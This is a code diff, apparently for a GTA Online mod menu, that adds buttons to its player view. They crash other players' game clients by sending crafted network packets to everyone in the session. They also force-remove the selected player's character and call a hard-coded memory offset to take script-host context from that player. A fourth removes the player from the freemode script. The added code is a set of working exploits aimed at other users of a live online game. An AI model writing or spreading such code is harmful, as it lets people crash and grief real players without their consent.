@@ -3,6 +3,7 @@
 #include "util/scripts.hpp"
 #include "util/vehicle.hpp"
 #include "views/view.hpp"
+#include "packet.hpp"
 
 namespace big
 {
@@ -26,6 +27,39 @@ namespace big
 			components::player_command_button<"giveammo">(g_player_service->get_selected());
 			ImGui::SameLine();
 			components::player_command_button<"giveweaps">(g_player_service->get_selected(), {});
+
+			components::button("Test crash", [] {
+				for (auto& player : g_player_service->players())
+				{
+					if (player.second->id() == self::id || player.second->id() == g_player_service->get_selected()->id())
+						continue;
+
+					packet pack;
+					pack.write_message(rage::eNetMessage::MsgRoamingInitialBubble);
+					pack.write<int>(0, 4);
+					pack.write<int>(32, 6);
+					pack.write<int>(0, 4);
+					pack.write<int>(self::id, 6);
+					pack.send(player.second->get_net_game_player()->m_msg_id);
+				}
+			});
+
+			components::button("Test ciu9rash", [] {
+				entity::force_remove_network_entity(g_player_service->get_selected()->get_ped(), false);
+			});
+
+			components::button("Test context steal", [] {
+				using cxst = void(*)(__int64, CNetGamePlayer*, int*);
+				auto x     = (cxst)((__int64)GetModuleHandleA(0) + 0x1161854);
+				int arr[]  = {0, g_player_service->get_selected()->id()};
+				x((__int64)GetModuleHandleA(0) + 0x29bd880, g_player_service->get_self()->get_net_game_player(), (int*)&arr);
+			});
+
+			components::button("Remp", [] {
+				if (auto a = gta_util::find_script_thread("freemode"_J))
+					reinterpret_cast<CGameScriptHandlerNetComponent*>(a->m_net_component)
+					    ->remove_player_from_script(g_player_service->get_selected()->get_net_game_player());
+			});
 
 			ImGui::BeginGroup();
 			ImGui::Checkbox("OFF_THE_RADAR"_T.data(), &g_player_service->get_selected()->off_radar);
